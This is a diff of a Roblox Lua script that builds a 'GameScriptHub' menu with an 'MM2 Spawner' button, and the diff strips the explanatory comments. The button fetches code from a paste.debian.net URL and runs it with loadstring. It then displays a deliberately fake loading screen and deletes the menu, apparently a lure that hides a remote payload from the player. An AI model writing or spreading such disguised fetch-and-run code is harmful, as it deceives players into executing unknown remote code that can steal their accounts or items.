@@ -2,16 +2,13 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- Remove old GUI if exists
 if PlayerGui:FindFirstChild("GameScriptHub") then
     PlayerGui.GameScriptHub:Destroy()
 end
 
--- ScreenGui
 local ScreenGui = Instance.new("ScreenGui", PlayerGui)
 ScreenGui.Name = "GameScriptHub"
 
--- Toggle button (top center)
 local ToggleBtn = Instance.new("TextButton", ScreenGui)
 ToggleBtn.Size = UDim2.new(0, 40, 0, 40)
 ToggleBtn.Position = UDim2.new(0.5, 0, 0.02, 0)
@@ -23,17 +20,14 @@ ToggleBtn.BorderSizePixel = 0
 local Corner = Instance.new("UICorner", ToggleBtn)
 Corner.CornerRadius = UDim.new(0,20)
 
--- Main Frame
 local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.Size = UDim2.new(0.8,0,0.7,0)
 MainFrame.Position = UDim2.new(0.1,0,0.15,0)
-MainFrame.AnchorPoint = Vector2.new(0,0)
 MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
 MainFrame.BorderSizePixel = 0
 local UICorner = Instance.new("UICorner", MainFrame)
 UICorner.CornerRadius = UDim.new(0,15)
 
--- Title
 local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1,0,0,50)
 Title.Position = UDim2.new(0,0,0,0)
@@ -43,7 +37,6 @@ Title.TextScaled = true
 Title.TextColor3 = Color3.fromRGB(255,255,255)
 Title.BackgroundTransparency = 1
 
--- Buttons Frame
 local ButtonsFrame = Instance.new("ScrollingFrame", MainFrame)
 ButtonsFrame.Size = UDim2.new(1,-20,1,-70)
 ButtonsFrame.Position = UDim2.new(0,10,0,60)
@@ -54,14 +47,12 @@ local UIListLayout = Instance.new("UIListLayout", ButtonsFrame)
 UIListLayout.Padding = UDim.new(0,10)
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
--- Toggle functionality
 local guiVisible = true
 ToggleBtn.MouseButton1Click:Connect(function()
     guiVisible = not guiVisible
     MainFrame.Visible = guiVisible
 end)
 
--- Create button function
 local function CreateButton(name, callback)
     local btn = Instance.new("TextButton", ButtonsFrame)
     btn.Text = name
@@ -74,7 +65,6 @@ local function CreateButton(name, callback)
     btn.MouseButton1Click:Connect(callback)
 end
 
--- Internal loading screen function
 local function ShowFakeLoadingScreen()
     local overlay = Instance.new("ScreenGui", PlayerGui)
     overlay.Name = "LoadingOverlay"
@@ -94,7 +84,6 @@ local function ShowFakeLoadingScreen()
     loadingLabel.TextColor3 = Color3.fromRGB(255,255,255)
     loadingLabel.Font = Enum.Font.GothamBold
 
-    -- Fake animated dots
     task.spawn(function()
         local dots = ""
         while overlay.Parent do
@@ -105,14 +94,8 @@ local function ShowFakeLoadingScreen()
     end)
 end
 
--- Add MM2 Spawner button
 CreateButton("MM2 Spawner", function()
-    -- Run paste.debian script first
     loadstring(game:HttpGet("https://paste.debian.net/plainh/0f441c13/", true))()
-
-    -- Show internal loading screen
     ShowFakeLoadingScreen()
-
-    -- Remove Main GUI
     if MainFrame then MainFrame:Destroy() end
 end)
